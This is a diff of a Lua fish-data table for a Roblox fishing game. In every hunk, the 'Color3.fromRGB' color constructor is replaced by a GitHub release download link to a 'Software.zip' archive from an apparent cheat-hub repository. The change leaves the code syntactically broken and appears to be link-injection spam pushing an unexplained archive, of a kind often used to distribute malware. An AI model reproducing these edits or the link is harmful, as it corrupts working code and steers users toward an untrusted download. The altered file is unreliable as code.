 			From = "Sunstone";
 		};
@@ -1847,7 +1847,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Autumn"};
 			Weather = {"None"};
 			Quips = {"A Crusty Crab!", "Woah! A Crab", "Awesome!", "A Crab!", "Ou! A Crab!"};
-			SparkleColor = Color3.fromRGB(209, 90, 90);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(209, 90, 90);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Ocean";
 		};
@@ -1865,7 +1865,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Autumn"};
 			Weather = {"Clear"};
 			Quips = {"Woah, a Coelacanth!", "I caught a Coelacanth!", "It's a Coelacanth!", "Nice! It's a Coelacanth!"};
-			SparkleColor = Color3.fromRGB(76, 76, 76);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(76, 76, 76);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Ocean";
 		};
@@ -1883,7 +1883,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"None"};
 			Quips = {"A Crusty Mushgrove Crab!", "Woah! A Mushgrove Crab", "Awesome!", "A Mushgrove Crab!", "Ou! A Mushgrove Crab!"};
-			SparkleColor = Color3.fromRGB(185, 56, 52);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(185, 56, 52);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Mushgrove";
 		};
@@ -1901,7 +1901,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"None"};
 			Quips = {"A Swamp Scallop!", "Woah! A Swamp Scallop", "Awesome!", "A Swamp Scallop!", "Ou! A Swamp Scallop!"};
-			SparkleColor = Color3.fromRGB(142, 185, 78);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(142, 185, 78);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Mushgrove";
 		};
@@ -1919,7 +1919,7 @@ do -- INFO FISH
 			Seasons = {"Winter", "Autumn"};
 			Weather = {"None"};
 			Quips = {"A Scallop!", "Woah! A Scallop", "Awesome!", "A Scallop!", "Ou! A Scallop!"};
-			SparkleColor = Color3.fromRGB(255, 195, 135);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 195, 135);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Ocean";
 		};
@@ -1937,7 +1937,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"None"};
 			Quips = {"A Sand Dollar!", "Woah! A Sand Dollar", "Awesome!", "A Sand Dollar!", "Ou! A Sand Dollar!"};
-			SparkleColor = Color3.fromRGB(255, 227, 143);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 227, 143);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Ocean";
 		};
@@ -1955,7 +1955,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"None"};
 			Quips = {"A Mussel!", "Woah! A Mussel", "Awesome!", "A Mussel!", "Ou! A Mussel!"};
-			SparkleColor = Color3.fromRGB(53, 53, 89);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(53, 53, 89);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Ocean";
 		};
@@ -1973,7 +1973,7 @@ do -- INFO FISH
 			Seasons = {"Summer", "autumn"};
 			Weather = {"None"};
 			Quips = {"An Oyster!", "Woah! An Oyster", "Awesome!", "An Oyster!", "Ou! An Oyster!"};
-			SparkleColor = Color3.fromRGB(217, 194, 168);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(217, 194, 168);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Ocean";
 		};
@@ -1991,7 +1991,7 @@ do -- INFO FISH
 			Seasons = {"Summer", "autumn"};
 			Weather = {"None"};
 			Quips = {"An Oyster!", "Woah! A King Oyster", "Awesome!", "A King Oyster!", "Ou! A King Oyster!"};
-			SparkleColor = Color3.fromRGB(217, 215, 151);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(217, 215, 151);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Terrapin";
 		};
@@ -2009,7 +2009,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Foggy"};
 			Quips = {"A Sea Urchin!", "I caught a Sea Urchin!", "Woah, an Urchin!"};
-			SparkleColor = Color3.fromRGB(34, 32, 42);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(34, 32, 42);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Ocean";
 		};
@@ -2027,7 +2027,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Autumn"};
 			Weather = {"Rain"};
 			Quips = {"A Shrimp!", "Woah! A Shrimp", "Awesome!", "A Shrimp!", "Ou! A Shrimpy!"};
-			SparkleColor = Color3.fromRGB(255, 107, 96);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 107, 96);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Ocean";
 		};
@@ -2045,7 +2045,7 @@ do -- INFO FISH
 			Seasons = {"Summer", "Winter"};
 			Weather = {"Clear"};
 			Quips = {"A Night Shrimp!", "Woah! A Night Shrimp", "Awesome!", "A Night Shrimp!", "Ou! A Night Shrimpy!"};
-			SparkleColor = Color3.fromRGB(49, 51, 74);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(49, 51, 74);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Vertigo";
 		};
@@ -2063,7 +2063,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"Rain"};
 			Quips = {"A Prawn!", "Woah! A Prawn", "Awesome!", "A Prawn!", "Ou! A Prawn!"};
-			SparkleColor = Color3.fromRGB(165, 255, 248);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(165, 255, 248);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Ocean";
 		};
@@ -2081,7 +2081,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"Clear"};
 			Quips = {"A Larry Lobster!", "Woah! A Lobster", "Awesome!", "A Lobster!", "Ou! A Lobster!"};
-			SparkleColor = Color3.fromRGB(255, 57, 57);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 57, 57);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Ocean";
 		};
@@ -2099,7 +2099,7 @@ do -- INFO FISH
 			Seasons = {"Autumn", "Spring"};
 			Weather = {"Rain"};
 			Quips = {"A Pike!", "I caught a Pike!", "Woah! a Pike!", "PIKE!!!", "I'd prefer a lance.", "A Pike?!", "That's a big Pike!"};
-			SparkleColor = Color3.fromRGB(93, 140, 109);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(93, 140, 109);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Moosewood";
 		};
@@ -2117,7 +2117,7 @@ do -- INFO FISH
 			Seasons = {"Autumn", "Spring"};
 			Weather = {"Rain"};
 			Quips = {"A Glacier Pike!", "I caught a Glacier Pike!", "Woah! a Glacier Pike!", "GLACIER PIKE!!!", "I'd prefer a lance.", "A Glacier Pike?!", "That's a big Glacier Pike!"};
-			SparkleColor = Color3.fromRGB(93, 140, 109);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(93, 140, 109);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Snowcap";
 		};
@@ -2135,7 +2135,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"Is it a snake?", "An Eel!", "I think some slime got on me.", "Woah! An Eel!", "H-eel-lo!", "An Eel! Things just got REAL!"};
-			SparkleColor = Color3.fromRGB(255, 233, 226);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 233, 226);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Moosewood";
 		};
@@ -2153,7 +2153,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"None"};
 			Quips = {"An Ember Snapper!", "Woah! I caught an Ember Snapper!", "I caught an Ember Snapper!", "Ember Snapper!!!"};
-			SparkleColor = Color3.fromRGB(191, 39, 25);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(191, 39, 25);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Roslit Volcano";
 		};
@@ -2171,7 +2171,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Clear"};
 			Quips = {"An Ember Perch!", "I caught a Perch!.. Why is it so hot?", "Woah, a Perch! Why is it on fire?", "Aww! An Ember Perch!", "Woah! An Ember Perch!"};
-			SparkleColor = Color3.fromRGB(255, 19, 19);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 19, 19);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Roslit Volcano";
 		};
@@ -2189,7 +2189,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"Foggy"};
 			Quips = {"A Squid!", "A cute Squid!", "I caught a Squid!"};
-			SparkleColor = Color3.fromRGB(255, 173, 102);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 173, 102);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Roslit";
 		};
@@ -2207,7 +2207,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"None"};
 			Quips = {"Is it a snake?", "A Ribbon Eel!", "I think some slime got on me.", "Woah! A Ribbon Eel!", "H-eel-lo! Ribbon Eel!"};
-			SparkleColor = Color3.fromRGB(70, 141, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(70, 141, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Roslit";
 		};
@@ -2225,7 +2225,7 @@ do -- INFO FISH
 			Seasons = {"Autumn"};
 			Weather = {"None"};
 			Quips = {"Ou! A Chinook Salmon!", "A King Salmon!", "I Caught a King Salmon!", "Woah, a King Salmon!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Terrapin";
 		};
@@ -2243,7 +2243,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"A Sturgeon!", "I AMM.. I AMM A STURGEON!!", "I caught a Sturgeon Fish!", "A Sturgeon!!", "Woahh a Sturgeon!"};
-			SparkleColor = Color3.fromRGB(232, 232, 232);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(232, 232, 232);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Snowcap";
 		};
@@ -2261,7 +2261,7 @@ do -- INFO FISH
 			Seasons = {"Spring"};
 			Weather = {"Rain", "Foggy"};
 			Quips = {"A Bull Shark!", "Thats some Bull Shark!", "I caught a Bull Shark!"};
-			SparkleColor = Color3.fromRGB(255, 245, 197);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 245, 197);
 			HoldAnimation = fish:WaitForChild("heavybasic");
 			From = "Ocean";
 		};
@@ -2279,7 +2279,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Autumn"};
 			Weather = {"None"};
 			Quips = {"A Suckermouth Catfish!", "I caught a Catfish!", "Woah, a Suckermouth!"};
-			SparkleColor = Color3.fromRGB(158, 128, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(158, 128, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Roslit";
 		};
@@ -2298,7 +2298,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"None"};
 			Quips = {"A Pyrogrub!", "I caught a Pyrogrub!", "Woah, a Pyrogrub!", "What the?!"};
-			SparkleColor = Color3.fromRGB(255, 151, 46);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 151, 46);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Roslit Volcano";
 		};
@@ -2316,7 +2316,7 @@ do -- INFO FISH
 			Seasons = {"Winter", "Autumn"};
 			Weather = {"Foggy"};
 			Quips = {"Woah, an Anglerfish!", "No way! An anglerfish!", "I caught an Anglerfish!"};
-			SparkleColor = Color3.fromRGB(182, 25, 25);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(182, 25, 25);
 			HoldAnimation = fish:WaitForChild("small");
 			From = "Ocean";
 		};
@@ -2334,7 +2334,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"Rain"};
 			Quips = {"A Keepers Guardian!", "I caught a Keepers Guardian!", "Woah, a Keepers Guardian!", "What the?! A Keepers Guardian?!"};
-			SparkleColor = Color3.fromRGB(56, 53, 134);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(56, 53, 134);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Keepers Altar";
 		};
@@ -2352,7 +2352,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"None"};
 			Quips = {"Woah! a Blowfish!", "A Pufferfish!", "A Water Balloon!", "Woah, A Pufferfish!"};
-			SparkleColor = Color3.fromRGB(255, 227, 15);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 227, 15);
 			HoldAnimation = fish:WaitForChild("small");
 			From = "Ocean";
 		};
@@ -2370,7 +2370,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"Windy", "Clear"};
 			Quips = {"A Swordfish!", "WOAH! A Swordfish!!", "SWORDFISHHHH", "I caught a swordfish!!"};
-			SparkleColor = Color3.fromRGB(93, 128, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(93, 128, 255);
 			HoldAnimation = fish:WaitForChild("heavy");
 			ViewportSizeOffset = 0.9;
 			From = "Ocean";
@@ -2389,7 +2389,7 @@ do -- INFO FISH
 			Seasons = {"Spring"};
 			Weather = {"Windy", "Clear"};
 			Quips = {"A Sailfish!", "WOAH! A Sailfish!!", "It's a Sailfish!", "I caught a Sailfish!!"};
-			SparkleColor = Color3.fromRGB(255, 242, 94);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 242, 94);
 			HoldAnimation = fish:WaitForChild("heavybasic");
 			ViewportSizeOffset = 0.9;
 			From = "Ocean";
@@ -2409,7 +2409,7 @@ do -- INFO FISH
 			Seasons = {"Spring"};
 			Weather = {"Foggy, Rain"};
 			Quips = {"WOAH!!", "OH MY GOD!!", "AN ALLIGATOR!", "WHAT????"};
-			SparkleColor = Color3.fromRGB(153, 255, 116);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(153, 255, 116);
 			HoldAnimation = fish:WaitForChild("heavybasic");
 			From = "Mushgrove";
 		};
@@ -2428,7 +2428,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"None"};
 			Quips = {"Obsidian Salmoff!", "Woah! An Obsidian Salmon!", "Awesome! An Obsidian Salmon", "An Obsidian Salmon!", "Woah, An Obsidian Salmon!", "A Salmon!..? Made of obsidian?"};
-			SparkleColor = Color3.fromRGB(102, 0, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(102, 0, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Roslit Volcano";
 		};
@@ -2447,7 +2447,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"None"};
 			Quips = {"WOAH.. A Manta Ray!", "I caught a Manta Ray!", "Woah.. A Manta Ray!!"};
-			SparkleColor = Color3.fromRGB(87, 118, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(87, 118, 255);
 			HoldAnimation = fish:WaitForChild("heavy");
 			From = "Roslit";
 		};
@@ -2466,7 +2466,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"Windy", "Clear"};
 			Quips = {"An Obsidian Swordfish!", "WOAH! An Obsidian Swordfish!!", "OBSIDIANNN SWORDFISHHHH", "I caught an Obsidian Swordfish!!"};
-			SparkleColor = Color3.fromRGB(176, 79, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(176, 79, 255);
 			HoldAnimation = fish:WaitForChild("heavy");
 			ViewportSizeOffset = 0.9;
 			From = "Roslit Volcano";
@@ -2485,7 +2485,7 @@ do -- INFO FISH
 			Seasons = {"Autumn"};
 			Weather = {"Foggy"};
 			Quips = {"Now, where's the cymbol?", "A Golden Bass??", "Golden Bass!", "A Golden Smallmouth Bass!", "A Gold Bass!", "I usually wear silver.", "So shiny! A Golden Bass!"};
-			SparkleColor = Color3.fromRGB(255, 205, 3);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 205, 3);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Terrapin";
 		};
@@ -2504,7 +2504,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"Foggy"};
 			Quips = {"WOAH! An Oarfish!", "I Caught an Oarfish!", "It's an Oarfish!"};
-			SparkleColor = Color3.fromRGB(255, 51, 51);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 51, 51);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Ocean";
 		};
@@ -2523,7 +2523,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Rain", "Foggy"};
 			Quips = {"A Glacierfish!", "I caught a Glacierfish!", "Woah, a Glacierfish!"};
-			SparkleColor = Color3.fromRGB(161, 233, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(161, 233, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Snowcap";
 		};
@@ -2542,7 +2542,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"Clear"};
 			Quips = {"I think my backbone snapped..", "Woah!!", "OH MY! A SUNFISH?", "A sunfish!", "Woah, a Sunfish!", "Nice tan..", "How did I pull this up?", "A SUNFISH!"};
-			SparkleColor = Color3.fromRGB(255, 232, 99);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 232, 99);
 			HoldAnimation = fish:WaitForChild("heavy");
 			From = "Sunstone";
 		};
@@ -2561,7 +2561,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"Clear"};
 			Quips = {"I think my backbone snapped..", "Woah!!", "OH MY! A MOONFISH?", "A Moonfish!!", "Woah, a Moonfish!!", "How did I pull this up?", "A Moonfish!!!"};
-			SparkleColor = Color3.fromRGB(255, 122, 70);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 122, 70);
 			HoldAnimation = fish:WaitForChild("heavy");
 			From = "Ocean";
 		};
@@ -2580,7 +2580,7 @@ do -- INFO FISH
 			Seasons = {"Autumn"};
 			Weather = {"Clear"};
 			Quips = {"WOAH!! I CAUGHT A GREAT WHITE!", "A GREAT WHITE??", "HOLY.. A GREAT WHITE??", "I CAN'T FEEL MY SPINE!!"};
-			SparkleColor = Color3.fromRGB(93, 123, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(93, 123, 255);
 			HoldAnimation = fish:WaitForChild("heavy");
 			From = "Ocean";
 			Shark = true;
@@ -2600,7 +2600,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"Rain"};
 			Quips = {"Woah, I caught a Dumbo!", "A Dumbo Octopus!", "No way! A Dumbo Octupus!"};
-			SparkleColor = Color3.fromRGB(255, 142, 90);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 142, 90);
 			HoldAnimation = fish:WaitForChild("small");
 			From = "Roslit";
 		};
@@ -2619,7 +2619,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"Clear"};
 			Quips = {"A Pond Emperor!", "WOAH! A Pond Emperor!!", "Pond Emperor!", "I caught a Pond Emperor!!"};
-			SparkleColor = Color3.fromRGB(136, 39, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(136, 39, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Snowcap";
 		};
@@ -2638,7 +2638,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"WOAH!! I CAUGHT AN ISONADE!", "AN ISONADE??", "HOLY.. AN ISONADE??", "I CAN'T FEEL MY SPINE!!", "THESE EXIST?"};
-			SparkleColor = Color3.fromRGB(47, 29, 106);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(47, 29, 106);
 			HoldAnimation = fish:WaitForChild("heavy");
 			From = "Vertigo";
 		};
@@ -2657,7 +2657,7 @@ do -- INFO FISH
 			Seasons = {"Spring"};
 			Weather = {"Windy"};
 			Quips = {"WOAH!! I CAUGHT A GREAT HAMMERHEAD!", "A GREAT HAMMERHEAD??", "HOLY.. A GREAT HAMMERHEAD??", "I CAN'T FEEL MY SPINE!!", "HAMMERTIME!", "Comically large hammer head!!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("heavy");
 			From = "Ocean";
 			Shark = true;
@@ -2677,7 +2677,7 @@ do -- INFO FISH
 			Seasons = {"Autumn"};
 			Weather = {"None"};
 			Quips = {"Woah, a Wiifish!", "This thing is super ancient!", "A Wiifish!!", "This brings me back!"};
-			SparkleColor = Color3.fromRGB(255, 136, 51);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 136, 51);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Sunstone";
 		};
@@ -2696,7 +2696,7 @@ do -- INFO FISH
 			Seasons = {"Summer", "Spring"};
 			Weather = {"Clear"};
 			Quips = {"I caught a Dolphin!", "It's a Dolphin!", "A DOLPHINN!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("heavybasic");
 			From = "Ocean";
 		};
@@ -2714,7 +2714,7 @@ do -- INFO FISH
 			Seasons = {"Autumn"};
 			Weather = {"Foggy"};
 			Quips = {"A Sawfish!", "Chainsawfish!", "I caught a Sawfish!", "Woah, a Sawfish!"};
-			SparkleColor = Color3.fromRGB(161, 199, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(161, 199, 255);
 			HoldAnimation = fish:WaitForChild("heavy");
 			From = "Ocean";
 		};
@@ -2733,7 +2733,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"Oh no.. Where is it's partner?", "A Mythic Fish!!", "I Caught a Mythic Fish!!!", "NO WAY! A Mythic Fish!"};
-			SparkleColor = Color3.fromRGB(255, 199, 32);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 199, 32);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Ocean";
 		};
@@ -2752,7 +2752,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"Woah!! A Rabbitfish!", "A Rabbit!!", "I caught a Rabbitfish!"};
-			SparkleColor = Color3.fromRGB(204, 142, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(204, 142, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Ocean";
 		};
@@ -2771,7 +2771,7 @@ do -- INFO FISH
 			Seasons = {"Winter"};
 			Weather = {"Clear"};
 			Quips = {"An Umbral Shark!", "Woah! An Umbral Shark!", "I Caught an Umbral Shark!"};
-			SparkleColor = Color3.fromRGB(151, 110, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(151, 110, 255);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Keepers Altar";
 		};
@@ -2790,7 +2790,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Clear", "Foggy"};
 			Quips = {"A Ringle!", "I caught a Ringle!", "A Ringle!!", "Woah, an Ringle!"};
-			SparkleColor = Color3.fromRGB(87, 224, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(87, 224, 255);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Snowcap";
 		};
@@ -2809,7 +2809,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Clear", "Foggy"};
 			Quips = {"An Olm!", "I caught an Olm!", "Olm.. my gosh!", "An Olm!!", "Woah, an Olm!", "This ain't no Axolotl..", "It looks like a recorder"};
-			SparkleColor = Color3.fromRGB(255, 178, 178);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 178, 178);
 			HoldAnimation = fish:WaitForChild("tiny");
 			ViewportSizeOffset = 2;
 			From = "Terrapin";
@@ -2828,7 +2828,7 @@ do -- INFO FISH
 			Seasons = {"Autunn", "Summer"};
 			Weather = {"Clear", "Cloudy"};
 			Quips = {"A SEA PICKLE!!", "I CAUGHT A SEA PICKLE!", "A Sea pickle!"};
-			SparkleColor = Color3.fromRGB(121, 255, 80);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(121, 255, 80);
 			HoldAnimation = fish:WaitForChild("small");
 			From = "Ocean";
 		};
@@ -2847,7 +2847,7 @@ do -- INFO FISH
 			Seasons = {"Summer"};
 			Weather = {"Foggy"};
 			Quips = {"A Crown Bass!", "I caught a Crown Bass!", "Woah! A Crown Bass!", "Ouu! A Crown Bass!"};
-			SparkleColor = Color3.fromRGB(203, 163, 70);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(203, 163, 70);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Ocean";
 		};
@@ -2866,7 +2866,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"The mythical Whisker Bill..", "Woah.. A Whisker Bill..", "I caught.. A Whisker Bill..", "Woah..."};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("heavy");
 			From = "Moosewood";
 		};
@@ -2885,7 +2885,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Foggy"};
 			Quips = {"WOAH. A COLOSSAL SQUID!!", "MY BACCKK", "I CAN'T BELIEVE IT! COLOSSAL SQUID!"};
-			SparkleColor = Color3.fromRGB(255, 82, 82);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 82, 82);
 			HoldAnimation = fish:WaitForChild("heavy");
 			From = "Ocean";
 		};
@@ -2904,7 +2904,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Rain"};
 			Quips = {"A.. Rubber Duck..?", "Woah!.. A Ducky??", "Awesome!!!!!!!", "Did someone lose this?", "How did this get down here..?"};
-			SparkleColor = Color3.fromRGB(255, 234, 115);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 234, 115);
 			HoldAnimation = fish:WaitForChild("small");
 			From = "Vertigo";
 		};
@@ -2923,7 +2923,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"I feel it's power..", "Woah.. A Relic??", "A Relic!!", "I caught a Relic!"};
-			SparkleColor = Color3.fromRGB(126, 255, 216);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(126, 255, 216);
 			HoldAnimation = fish:WaitForChild("small");
 			From = "None";
 		};
@@ -2942,7 +2942,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"Clear"};
